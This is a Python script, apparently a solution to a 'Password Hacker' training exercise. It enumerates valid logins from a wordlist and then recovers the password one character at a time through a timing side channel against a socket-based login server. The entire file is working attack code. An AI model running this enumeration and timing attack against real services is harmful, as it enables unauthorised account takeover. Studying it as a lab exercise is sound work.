import socket
import argparse
from time import time
import string
import json

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()
with socket.socket() as hack_socket, \
     open('C:/Users/Nique/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', 'r', encoding='utf-8') as login_file:
    hack_socket.connect((args.host, args.port))
    for login in login_file:
        hack_socket.send(json.dumps({"login": login.rstrip(), "password": " "}).encode())
        result = json.loads(hack_socket.recv(1024))
        if result['result'] == "Wrong password!":
            break
    password = ''
    while True:
        for letter in string.ascii_letters + string.digits:
            start = time()
            hack_socket.send(json.dumps({"login": login.rstrip(), "password": password + letter}).encode())
            result = json.loads(hack_socket.recv(2048))
            if time() - start > 0.1:
                password += letter
            elif result['result'] == "Connection success!":
                print(json.dumps({"login": login.rstrip(), "password": password + letter}))
                hack_socket.close()
                exit()